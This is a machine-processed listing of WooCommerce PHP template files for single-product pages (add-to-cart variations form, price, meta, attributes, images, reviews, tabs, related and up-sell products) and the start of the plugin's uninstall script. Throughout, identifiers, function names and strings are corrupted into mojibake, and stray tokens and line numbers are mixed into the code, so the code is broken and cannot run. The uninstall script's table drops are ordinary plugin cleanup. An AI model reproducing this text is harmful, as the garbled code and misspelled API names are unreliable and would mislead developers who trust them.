	gex™
;

12 
glob®
 
	g$woocomm”û
, 
	g$´oduù
, 
	g$po¡
;

15 <?
php
 
do_aùiÚ
( 'woocommerce_before_add_to_cart_form' ); ?>

17 <
fÜm
 
	gşass
="v¬ŸtiÚs_fÜm c¬t" 
m‘hod
="po¡" 
’ùy³
='muÉ¬t/fÜm-d©a' 
d©a
-
´oduù_id
="<?ph°echØ$po¡->ID; ?>" d©a-
´oduù_v¬ŸtiÚs
="<?phpƒchoƒsc_attr( json_encode( $available_variations ) ) ?>">

18 <?
php
 iàĞ! 
	$em±y
Ğ
$avaabË_v¬ŸtiÚs
 ) ) : ?>

19 <
bË
 
şass
="v¬ŸtiÚs" 
ûÎ¥acšg
="0">

20 <
tbody
>

21 <?
php
 
$loİ
 = 0; 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$Çme
 => 
$İtiÚs
 ) : $loop++; ?>

22 <
Œ
>

23 <
td
 
şass
="Ïb–"><
Ïb–
 ="<?ph°echØ§n™ize_t™Ë($Çme); ?>"><?
php
 
echo
 
	`wc_©Œibu‹_Ïb–
Ğ
$Çme
 ); ?></label></td>

24 <
td
 
şass
="v®ue"><
£Ëù
 
id
="<?ph°echØesc_©ŒĞ§n™ize_t™ËĞ$Çmè); ?>" 
Çme
="attribute_<?phpƒcho sanitize_title( $name ); ?>">

25 <
İtiÚ
 
v®ue
=""><?
php
 
echo
 
	`__
Ğ'Choo£‡ÀİtiÚ', 'woocomm”û' ) ?>&
h–l
;</option>

26 <?
php


27 iàĞ
	$is_¬¿y
Ğ
$İtiÚs
 ) ) {

29 iàĞ
	`is£t
Ğ
$_REQUEST
[ '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$Çme
 ) ] ) ) {

30 
$£Ëùed_v®ue
 = 
$_REQUEST
[ '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$Çme
 ) ];

31 } 
	`–£if
 ( 
	`is£t
Ğ
$£Ëùed_©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$Çme
 ) ] ) ) {

32 
$£Ëùed_v®ue
 = 
$£Ëùed_©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$Çme
 ) ];

34 
$£Ëùed_v®ue
 = '';

38 iàĞ
	`xÚomy_exi¡s
Ğ
$Çme
 ) ) {

40 
$Üd”by
 = 
	`wc_©Œibu‹_Üd”by
Ğ
$Çme
 );

42  
$Üd”by
 ) {

44 
$¬gs
 = 
	`¬¿y
Ğ'Üd”by' => 'Çme', 'hide_em±y' => 
çl£
, 'menu_order' => false );

47 
$¬gs
 = 
	`¬¿y
Ğ'Üd”by' => 'id', 'Üd”' => 'ASC', 'm’u_Üd”' => 
çl£
, 'hide_empty' => false );

50 
$¬gs
 = 
	`¬¿y
Ğ'm’u_Üd”' => 'ASC', 'hide_em±y' => 
çl£
 );

54 
$‹rms
 = 
	`g‘_‹rms
Ğ
$Çme
, 
$¬gs
 );

56 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

57 iàĞ! 
	`š_¬¿y
Ğ
$‹rm
->
¦ug
, 
$İtiÚs
 ) )

60 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$‹rm
->
¦ug
 ) . '" ' . 
	`£Ëùed
Ğ
	`§n™ize_t™Ë
Ğ
$£Ëùed_v®ue
 ), sª™ize_t™ËĞ$‹rm->¦ug ), 
çl£
 ) . '>' . 
	`­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_İtiÚ_Çme', $‹rm->
Çme
 ) . '</option>';

64 
	`fÜ—ch
 ( 
$İtiÚs
 
as
 
$İtiÚ
 ) {

65 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
	`§n™ize_t™Ë
Ğ
$İtiÚ
 ) ) . '" ' . 
	`£Ëùed
Ğ§n™ize_t™ËĞ
$£Ëùed_v®ue
 ), sª™ize_t™ËĞ$İtiÚ ), 
çl£
 ) . '>' . 
	`esc_html
Ğ
	`­¶y_f‹rs
( 'woocommerce_variation_option_name', $option ) ) . '</option>';

69 
	}
}

71 </
	g£Ëù
> <?
php


72 iàĞĞ
	g$©Œibu‹s
 ) =ğ
$loİ
 )

73 
echo
 '<¨şass="»£t_v¬ŸtiÚs" h»f="#»£t">' . 
__
( 'Clear selection', 'woocommerce' ) . '</a>';

74 ?></
	gtd
>

75 </
	gŒ
>

76 <?
php
 
	g’dfÜ—ch
;?>

77 </
	gtbody
>

78 </
	gbË
>

80 <?
php
 
do_aùiÚ
( 'woocommerce_before_add_to_cart_button' ); ?>

82 <
div
 
	gşass
="sšgË_v¬ŸtiÚ_w¿p" 
¡yË
="display:none;">

83 <?
php
 
do_aùiÚ
( 'woocommerce_before_single_variation' ); ?>

85 <
div
 
	gşass
="single_variation"></div>

87 <
div
 
şass
="variations_button">

88 <?
php
 
woocomm”û_quªt™y_šput
(); ?>

89 <
bu‰Ú
 
	gty³
="subm™" 
şass
="sšgË_add_to_ÿ¹_bu‰Ú bu‰Ú‡É"><?
php
 
echo
 
$´oduù
->
sšgË_add_to_ÿ¹_‹xt
(); ?></
	gbu‰Ú
>

90 </
	gdiv
>

92 <
šput
 
	gty³
="hidd’" 
Çme
="add-to-ÿ¹" 
v®ue
="<?phpƒcho $product->id; ?>" />

93 <
šput
 
ty³
="hidd’" 
Çme
="´oduù_id" 
v®ue
="<?phpƒchoƒsc_attr( $post->ID ); ?>" />

94 <
šput
 
ty³
="hidd’" 
Çme
="v¬ŸtiÚ_id" 
v®ue
="" />

96 <?
php
 
do_aùiÚ
( 'woocommerce_after_single_variation' ); ?>

97 </
	gdiv
>

99 <?
php
 
do_aùiÚ
( 'woocommerce_after_add_to_cart_button' ); ?>

101 <?
php
 : ?>

103 <
p
 
şass
="¡ock out-of-¡ock"><?
php
 
_e
Ğ'Thi ´oduù i cu¼’y ouˆoà¡ock‡nd uÇvaabË.', 'woocomm”û' ); ?></
	gp
>

105 <?
php
 
	g’dif
; ?>

107 </
	gfÜm
>

109 <?
php
 
do_aùiÚ
( 'woocommerce_after_add_to_cart_form' ); ?>

	@templates/single-product/meta.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$´oduù
;

14 
	g$ÿt_couÁ
 = Ğ
g‘_the_‹rms
Ğ
$po¡
->
ID
, 'product_cat' ) );

15 
	g$g_couÁ
 = Ğ
g‘_the_‹rms
Ğ
$po¡
->
ID
, 'product_tag' ) );

17 <
div
 
	gşass
="product_meta">

19 <?
php
 
do_aùiÚ
( 'woocommerce_product_meta_start' ); ?>

21 <?
php
 iàĞ
wc_´oduù_sku_’abËd
(è&& ( 
	g$´oduù
->
g‘_sku
(è|| $´oduù->
is_ty³
( 'variable' ) ) ) : ?>

23 <
¥ª
 
şass
="sku_w¿µ”"><?
php
 
_e
Ğ'SKU:', 'woocomm”û' ); ?> <¥ª 
	gşass
="sku" 
™em´İ
="sku"><?ph°
echo
 ( 
$sku
 = 
$´oduù
->
g‘_sku
(èè? $sku : 
__
Ğ'N/A', 'woocomm”û' ); ?></
	g¥ª
>.</span>

25 <?
php
 
	g’dif
; ?>

27 <?
php
 
echo
 
	g$´oduù
->
g‘_ÿ‹gÜ›s
Ğ', ', '<¥ª cÏss="po¡ed_š">' . 
_n
Ğ'C©egÜy:', 'C©egÜ›s:', 
$ÿt_couÁ
, 'woocommerce' ) . ' ', '.</span>' ); ?>

29 <?
php
 
echo
 
	g$´oduù
->
g‘_gs
Ğ', ', '<¥ª cÏss="gged_as">' . 
_n
Ğ'Tag:', 'Tags:', 
$g_couÁ
, 'woocommerce' ) . ' ', '.</span>' ); ?>

31 <?
php
 
do_aùiÚ
( 'woocommerce_product_meta_end' ); ?>

33 </
	gdiv
>

	@templates/single-product/price.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$´oduù
;

14 <
div
 
	g™em´İ
="ofãrs" 
™emscİe
 
™emty³
="http://schema.org/Offer">

16 <
p
 
şass
="´iû"><?
php
 
echo
 
$´oduù
->
g‘_´iû_html
(); ?></
	gp
>

18 <
m‘a
 
	g™em´İ
="´iû" 
cÚ‹Á
="<?phpƒcho $product->get_price(); ?>" />

19 <
m‘a
 
™em´İ
="´iûCu¼’cy" 
cÚ‹Á
="<?phpƒcho get_woocommerce_currency(); ?>" />

20 <
lšk
 
™em´İ
="avaab™y" 
h»f
="http://schema.org/<?phpƒcho $product->is_in_stock() ? 'InStock' : 'OutOfStock'; ?>" />

22 </
div
>

	@templates/single-product/product-attributes.php

1 <?
php


12 iàĞ! 
defšed
( 'ABSPATH' ) ) {

13 
	gex™
;

16 
	g$has_row
 = 
çl£
;

17 
	g$®t
 = 1;

18 
	g$©Œibu‹s
 = 
$´oduù
->
g‘_©Œibu‹s
();

20 
ob_¡¬t
();

22 <
bË
 
	gşass
="shop_attributes">

24 <?
php
 iàĞ
$´oduù
->
	$’abË_dim’siÚs_di¥Ïy
() ) : ?>

26 <?
php
 iàĞ
$´oduù
->
	$has_weight
(èè: 
$has_row
 = 
Œue
; ?>

27 <
Œ
 
şass
="<?php if ( ( $alt = $alt * -1 ) == 1 )ƒcho 'alt'; ?>">

28 <
th
><?
php
 
	`_e
( 'Weight', 'woocommerce' ) ?></th>

29 <
td
 
şass
="´oduù_weight"><?
php
 
echo
 
$´oduù
->
	`g‘_weight
(è. ' ' . 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
( 'woocommerce_weight_unit' ) ); ?></td>

30 </
Œ
>

31 <?
php
 
’dif
; ?>

33 <?
php
 iàĞ
$´oduù
->
	$has_dim’siÚs
(èè: 
$has_row
 = 
Œue
; ?>

34 <
Œ
 
şass
="<?php if ( ( $alt = $alt * -1 ) == 1 )ƒcho 'alt'; ?>">

35 <
th
><?
php
 
	`_e
( 'Dimensions', 'woocommerce' ) ?></th>

36 <
td
 
şass
="´oduù_dim’siÚs"><?
php
 
echo
 
$´oduù
->
	`g‘_dim’siÚs
(); ?></td>

37 </
Œ
>

38 <?
php
 
’dif
; ?>

40 <?
php
 
’dif
; ?>

42 <?
php
 
	$fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) :

43 iàĞ
	`em±y
Ğ
$©Œibu‹
['is_visibË'] ) || ( $©Œibu‹['is_xÚomy'] && ! 
	`xÚomy_exi¡s
( $attribute['name'] ) ) ) {

45 
	}
} {

46 
	g$has_row
 = 
Œue
;

49 <
Œ
 
	gşass
="<?php if ( ( $alt = $alt * -1 ) == 1 )ƒcho 'alt'; ?>">

50 <
th
><?
php
 
echo
 
wc_©Œibu‹_Ïb–
Ğ
$©Œibu‹
['Çme'] ); ?></
	gth
>

51 <
	gtd
><?
php


52 iàĞ
	g$©Œibu‹
['is_taxonomy'] ) {

54 
	g$v®ues
 = 
wc_g‘_´oduù_‹rms
Ğ
$´oduù
->
id
, 
$©Œibu‹
['Çme'], 
¬¿y
( 'fields' => 'names' ) );

55 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹', 
w·utİ
Ğ
w±exturize
Ğ
im¶ode
Ğ', ', 
$v®ues
 ) ) ), 
$©Œibu‹
, $values );

60 
	g$v®ues
 = 
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

61 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹', 
w·utİ
Ğ
w±exturize
Ğ
im¶ode
Ğ', ', 
$v®ues
 ) ) ), 
$©Œibu‹
, $values );

64 ?></
	gtd
>

65 </
	gŒ
>

66 <?
php
 
	g’dfÜ—ch
; ?>

68 </
	gbË
>

69 <?
php


70 iàĞ
	g$has_row
 ) {

71 
echo
 
ob_g‘_ş—n
();

73 
ob_’d_ş—n
();

	@templates/single-product/product-image.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$woocomm”û
, 
	g$´oduù
;

15 <
div
 
	gşass
="images">

17 <?
php


18 iàĞ
	$has_po¡_thumbÇ
() ) {

20 
$image_t™Ë
 = 
	`esc_©Œ
Ğ
	`g‘_the_t™Ë
Ğ
	`g‘_po¡_thumbÇ_id
() ) );

21 
$image_lšk
 = 
	`wp_g‘_©chm’t_u¾
Ğ
	`g‘_po¡_thumbÇ_id
() );

22 
$image
 = 
	`g‘_the_po¡_thumbÇ
Ğ
$po¡
->
ID
, 
	`­¶y_f‹rs
Ğ'sšgË_´oduù_Ïrge_thumbÇ_size', 'shİ_sšgË' ), 
	`¬¿y
(

23 't™Ë' => 
$image_t™Ë


26 
$©chm’t_couÁ
 = 
	`couÁ
Ğ
$´oduù
->
	`g‘_g®Ëry_©chm’t_ids
() );

28 iàĞ
$©chm’t_couÁ
 > 0 ) {

29 
$g®Ëry
 = '[product-gallery]';

31 
$g®Ëry
 = '';

34 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_sšgË_´oduù_image_html', 
	`¥rštf
Ğ'<¨h»f="%s" i‹m´İ="image" cÏss="woocomm”û-maš-imagzoom"™Ë="%s" d©a-»l="´‘tyPhÙo' . 
$g®Ëry
 . '">%s</a>', 
$image_lšk
, 
$image_t™Ë
, 
$image
 ), 
$po¡
->
ID
 );

36 
	}
} {

38 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_sšgË_´oduù_image_html', 
¥rštf
Ğ'<img src="%s"‡É="PÏûhŞd”" />', 
wc_¶aûhŞd”_img_¤c
(è), 
$po¡
->
ID
 );

43 <?
php
 
do_aùiÚ
( 'woocommerce_product_thumbnails' ); ?>

45 </
	gdiv
>

	@templates/single-product/product-thumbnails.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$´oduù
, 
	g$woocomm”û
;

14 
	g$©chm’t_ids
 = 
$´oduù
->
g‘_g®Ëry_©chm’t_ids
();

16 iàĞ
	g$©chm’t_ids
 ) {

18 <
div
 
	gşass
="thumbÇs"><?
php


20 
$loİ
 = 0;

21 
	g$cŞumns
 = 
­¶y_f‹rs
( 'woocommerce_product_thumbnails_columns', 3 );

23 
fÜ—ch
 ( 
$©chm’t_ids
 
as
 
$©chm’t_id
 ) {

25 
	g$şas£s
 = 
¬¿y
( 'zoom' );

27 iàĞ
	g$loİ
 =ğ0 || 
$loİ
 % 
$cŞumns
 == 0 )

28 
$şas£s
[] = 'first';

30 iàĞĞ
	g$loİ
 + 1 ) % 
	g$cŞumns
 == 0 )

31 
$şas£s
[] = 'last';

33 
	g$image_lšk
 = 
wp_g‘_©chm’t_u¾
Ğ
$©chm’t_id
 );

35 iàĞ! 
	g$image_lšk
 )

38 
	g$image
 = 
wp_g‘_©chm’t_image
Ğ
$©chm’t_id
, 
­¶y_f‹rs
( 'single_product_small_thumbnail_size', 'shop_thumbnail' ) );

39 
	g$image_şass
 = 
esc_©Œ
Ğ
im¶ode
Ğ' ', 
$şas£s
 ) );

40 
	g$image_t™Ë
 = 
esc_©Œ
Ğ
g‘_the_t™Ë
Ğ
$©chm’t_id
 ) );

42 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_sšgË_´oduù_image_thumbÇ_html', 
¥rštf
Ğ'<¨h»f="%s" cÏss="%s"™Ë="%s" d©a-»l="´‘tyPhÙo[´oduù-g®Ëry]">%s</a>', 
$image_lšk
, 
$image_şass
, 
$image_t™Ë
, 
$image
 ), 
$©chm’t_id
, 
$po¡
->
ID
, $image_class );

44 
	g$loİ
++;

47 ?></
	gdiv
>

48 <?
	gphp


	@templates/single-product/rating.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
;

14 iàĞ
g‘_İtiÚ
( 'woocommerce_enable_review_rating' ) === 'no' )

17 
	g$couÁ
 = 
$´oduù
->
g‘_¿tšg_couÁ
();

18 
	g$av”age
 = 
$´oduù
->
g‘_av”age_¿tšg
();

20 iàĞ
	g$couÁ
 > 0 ) : ?>

22 <
div
 
şass
="woocomm”û-´oduù-¿tšg" 
™em´İ
="agg»g©eR©šg" 
™emscİe
 
™emty³
="http://schema.org/AggregateRating">

23 <
div
 
şass
="¡¬-¿tšg" 
t™Ë
="<?php…rintf( __( 'Rated %s out of 5', 'woocommerce' ), $average ); ?>">

24 <
¥ª
 
¡yË
="width:<?phpƒcho ( ( $average / 5 ) * 100 ); ?>%">

25 <
¡rÚg
 
™em´İ
="¿tšgV®ue" 
şass
="¿tšg"><?
php
 
echo
 
esc_html
Ğ
$av”age
 ); ?></
	g¡rÚg
> <?ph°
_e
( 'out of 5', 'woocommerce' ); ?>

26 </
	g¥ª
>

27 </
	gdiv
>

28 <
a
 
	gh»f
="#»v›ws" 
şass
="woocomm”û-»v›w-lšk" 
»l
="nofŞlow">(<?
php
 
´štf
Ğ
_n
Ğ'% cu¡om”„ev›w', '% cu¡om”„ev›ws', 
$couÁ
, 'woocomm”û' ), '<¥ª i‹m´İ="¿tšgCouÁ" cÏss="couÁ">' . $couÁ . '</¥ª>' ); ?>)</
	ga
>

29 </
	gdiv
>

31 <?
php
 
	g’dif
; ?>

	@templates/single-product/related.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
, 
	g$woocomm”û_loİ
;

14 
	g$»Ï‹d
 = 
$´oduù
->
g‘_»Ï‹d
Ğ
$po¡s_³r_·ge
 );

16 iàĞĞ
	g$»Ï‹d
 ) == 0 ) ;

18 
	g$¬gs
 = 
­¶y_f‹rs
Ğ'woocomm”û_»Ï‹d_´oduùs_¬gs', 
¬¿y
(

22 'po¡s_³r_·ge' => 
$po¡s_³r_·ge
,

23 'Üd”by' => 
$Üd”by
,

24 'po¡__š' => 
$»Ï‹d
,

25 'po¡__nÙ_š' => 
¬¿y
Ğ
$´oduù
->
id
 )

28 
	g$´oduùs
 = 
Ãw
 
WP_Qu”y
Ğ
$¬gs
 );

30 
	g$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

32 iàĞ
	g$´oduùs
->
	$have_po¡s
() ) : ?>

34 <
div
 
şass
="related…roducts">

36 <
h2
><?
php
 
	`_e
( 'Related Products', 'woocommerce' ); ?></h2>

38 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

40 <?
php
  
$´oduùs
->
	$have_po¡s
(èè: 
$´oduùs
->
	`the_po¡
(); ?>

42 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

44 <?
php
 
’dwhe
;

46 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

48 </
div
>

50 <?
php
 
’dif
;

52 
	`wp_»£t_po¡d©a
();

	@templates/single-product/review.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
	g$¿tšg
 = 
štv®
Ğ
g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, '¿tšg', 
Œue
 ) );

16 <
li
 
	g™em´İ
="»v›ws" 
™emscİe
 
™emty³
="h‰p://schema.Üg/Rev›w" <?
php
 
comm’t_şass
(); ?> 
	gid
="li-comment-<?php comment_ID() ?>">

18 <
div
 
id
="comm’t-<?ph°comm’t_ID(); ?>" 
şass
="comment_container">

20 <?
php
 
echo
 
g‘_av©¬
Ğ
$comm’t
, 
­¶y_f‹rs
Ğ'woocomm”û_»v›w_g¿v©¬_size', '60' ), '', 
g‘_comm’t_authÜ
() ); ?>

22 <
div
 
	gşass
="comment-text">

24 <?
php
 iàĞ
$¿tšg
 && 
g‘_İtiÚ
( 'woocommerce_enable_review_rating' ) == 'yes' ) : ?>

26 <
div
 
™em´İ
="»v›wR©šg" 
™emscİe
 
™emty³
="h‰p://schema.Üg/R©šg" 
şass
="¡¬-¿tšg" 
t™Ë
="<?phpƒcho sprintf( __( 'Rated %d out of 5', 'woocommerce' ), $rating ) ?>">

27 <
¥ª
 
¡yË
="width:<?ph°echØĞ$¿tšg / 5 ) * 100; ?>%"><
¡rÚg
 
™em´İ
="¿tšgV®ue"><?
php
 
echo
 
$¿tšg
; ?></
	g¡rÚg
> <?ph°
_e
Ğ'ouˆoà5', 'woocomm”û' ); ?></
	g¥ª
>

28 </
	gdiv
>

30 <?
php
 
	g’dif
; ?>

32 <?
php
 iàĞ
	g$comm’t
->
	gcomm’t_­´oved
 == '0' ) : ?>

34 <
p
 
şass
="m‘a"><
em
><?
php
 
_e
Ğ'You¸comm’ˆi awa™šg‡µrov®', 'woocomm”û' ); ?></
	gem
></
	gp
>

36 <?
php
 : ?>

38 <
p
 
şass
="meta">

39 <
¡rÚg
 
™em´İ
="authÜ"><?
php
 
comm’t_authÜ
(); ?></
	g¡rÚg
> <?php

41 iàĞ
g‘_İtiÚ
( 'woocommerce_review_rating_verification_label' ) === 'yes' )

42 iàĞ
wc_cu¡om”_bought_´oduù
Ğ
$comm’t
->
comm’t_authÜ_ema
, $comm’t->
u£r_id
, $comm’t->
comm’t_po¡_ID
 ) )

43 
	gecho
 '<em cÏss="v”if›d">(' . 
__
( 'verified owner', 'woocommerce' ) . ')</em> ';

45 ?>&
	gndash
; <
time
 
	g™em´İ
="d©ePublished" 
d©‘ime
="<?ph°echØg‘_comm’t_d©eĞ'c' ); ?>"><?
php
 
echo
 
g‘_comm’t_d©e
Ğ
__
Ğ
g‘_İtiÚ
Ğ'd©e_fÜm©' ), 'woocomm”û' ) ); ?></
	gtime
>:

46 </
p
>

48 <?
php
 
’dif
; ?>

50 <
div
 
	g™em´İ
="desütiÚ" 
şass
="desütiÚ"><?
php
 
comm’t_‹xt
(); ?></
	gdiv
>

51 </
	gdiv
>

52 </
	gdiv
>

	@templates/single-product/sale-flash.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$´oduù
;

14 <?
php
 iàĞ
	g$´oduù
->
	$is_Ú_§Ë
() ) : ?>

16 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_§Ë_æash', '<¥ª cÏss="Ú§Ë">' . 
	`__
Ğ'S®e!', 'woocomm”û' ) . '</¥ª>', 
$po¡
, 
$´oduù
 ); ?>

18 <?
php
 
’dif
; ?>

	@templates/single-product/share.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 <?
php
 
do_aùiÚ
( 'woocommerce_share' );

	@templates/single-product/short-description.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
;

14 iàĞ! 
	g$po¡
->
	gpo¡_exû½t
 ) ;

16 <
div
 
	g™em´İ
="description">

17 <?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_shÜt_desütiÚ', 
$po¡
->
po¡_exû½t
 ) ?>

18 </
	gdiv
>

	@templates/single-product/tabs/additional-information.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

12 
	gex™
;

15 
glob®
 
	g$´oduù
;

17 
	g$h—dšg
 = 
­¶y_f‹rs
Ğ'woocomm”û_´oduù_add™iÚ®_šfÜm©iÚ_h—dšg', 
__
( 'Additional Information', 'woocommerce' ) );

20 <?
php
 iàĞ
	g$h—dšg
 ): ?>

21 <
h2
><?
php
 
echo
 
$h—dšg
; ?></
	gh2
>

22 <?
php
 
	g’dif
; ?>

24 <?
php
 
	g$´oduù
->
li¡_©Œibu‹s
(); ?>

	@templates/single-product/tabs/description.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
, 
	g$po¡
;

14 
	g$h—dšg
 = 
esc_html
Ğ
­¶y_f‹rs
Ğ'woocomm”û_´oduù_desütiÚ_h—dšg', 
__
( 'Product Description', 'woocommerce' ) ) );

17 <
	gh2
><?
php
 
echo
 
	g$h—dšg
; ?></h2>

19 <?
php
 
the_cÚ‹Á
(); ?>

	@templates/single-product/tabs/tabs.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 
	g$bs
 = 
­¶y_f‹rs
Ğ'woocomm”û_´oduù_bs', 
¬¿y
() );

20 iàĞ! 
	$em±y
Ğ
$bs
 ) ) : ?>

22 <
div
 
şass
="woocommerce-tabs">

23 <
ul
 
şass
="tabs">

24 <?
php
 
	`fÜ—ch
 ( 
$bs
 
as
 
$key
 => 
$b
 ) : ?>

26 <
li
 
şass
="<?phpƒcho $key ?>_tab">

27 <
a
 
h»f
="#b-<?ph°echØ$key ?>"><?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_' . 
$key
 . '_b_t™Ë', 
$b
['title'], $key ) ?></a>

28 </
li
>

30 <?
php
 
’dfÜ—ch
; ?>

31 </
ul
>

32 <?
php
 
	`fÜ—ch
 ( 
$bs
 
as
 
$key
 => 
$b
 ) : ?>

34 <
div
 
şass
="·ÃÈ’Œy-cÚ‹Á" 
id
="tab-<?phpƒcho $key ?>">

35 <?
php
 
	`ÿÎ_u£r_func
Ğ
$b
['ÿÎback'], 
$key
, $tab ) ?>

36 </
div
>

38 <?
php
 
’dfÜ—ch
; ?>

39 </
div
>

41 <?
php
 
’dif
; ?>

	@templates/single-product/title.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 <
h1
 
	g™em´İ
="Çme" 
şass
="´oduù_t™ËƒÁry-t™Ë"><?
php
 
the_t™Ë
(); ?></
	gh1
>

	@templates/single-product/up-sells.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
, 
	g$woocomm”û_loİ
;

14 
	g$up£Îs
 = 
$´oduù
->
g‘_up£Îs
();

16 iàĞĞ
	g$up£Îs
 ) == 0 ) ;

18 
	g$m‘a_qu”y
 = 
WC
()->
qu”y
->
g‘_m‘a_qu”y
();

20 
	g$¬gs
 = 
¬¿y
(

24 'po¡s_³r_·ge' => 
$po¡s_³r_·ge
,

25 'Üd”by' => 
$Üd”by
,

26 'po¡__š' => 
$up£Îs
,

27 'po¡__nÙ_š' => 
¬¿y
Ğ
$´oduù
->
id
 ),

28 'm‘a_qu”y' => 
$m‘a_qu”y


31 
	g$´oduùs
 = 
Ãw
 
WP_Qu”y
Ğ
$¬gs
 );

33 
	g$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

35 iàĞ
	g$´oduùs
->
	$have_po¡s
() ) : ?>

37 <
div
 
şass
="upsells…roducts">

39 <
h2
><?
php
 
	`_e
( 'You may‡lso†ike&hellip;', 'woocommerce' ) ?></h2>

41 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

43 <?
php
  
$´oduùs
->
	$have_po¡s
(èè: 
$´oduùs
->
	`the_po¡
(); ?>

45 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

47 <?
php
 
’dwhe
;

49 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

51 </
div
>

53 <?
php
 
’dif
;

55 
	`wp_»£t_po¡d©a
();

	@templates/taxonomy-product_cat.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
wc_g‘_‹m¶©e
( 'archive-product.php' );

	@templates/taxonomy-product_tag.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
wc_g‘_‹m¶©e
( 'archive-product.php' );

	@uninstall.php

1 <?
php


12 ifĞ! 
defšed
( 'WP_UNINSTALL_PLUGIN' ) )

13 
ex™
();

15 
glob®
 
	g$wpdb
, 
	g$wp_rŞes
;

17 
	g$¡©us_İtiÚs
 = 
g‘_İtiÚ
Ğ'woocomm”û_¡©us_İtiÚs', 
¬¿y
() );

20 
	g$š¡®Ër
 = 
šşude
( 'includes/class-wc-install.php' );

21 
	g$š¡®Ër
->
»move_rŞes
();

24 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_shop_page_id' ) );

25 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_cart_page_id' ) );

26 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_checkout_page_id' ) );

27 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_myaccount_page_id' ) );

28 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_edit_address_page_id' ) );

29 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_view_order_page_id' ) );

30 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_change_password_page_id' ) );

31 
wp_Œash_po¡
Ğ
g‘_İtiÚ
( 'woocommerce_logout_page_id' ) );

34 iàĞ
	g$mijœeh_·ge
 = 
g‘_·ge_by_·th
( 'mijireh-secure-checkout' ) )

35 
wp_Œash_po¡
Ğ
$mijœeh_·ge
->
ID
 );

38 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_attribute_taxonomies" );

39 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_downloadable_product_permissions" );

40 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_termmeta" );

41 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
ba£_´efix
 . "shareyourcart_tokens" );

42 
	g$wpdb
->
qu”y
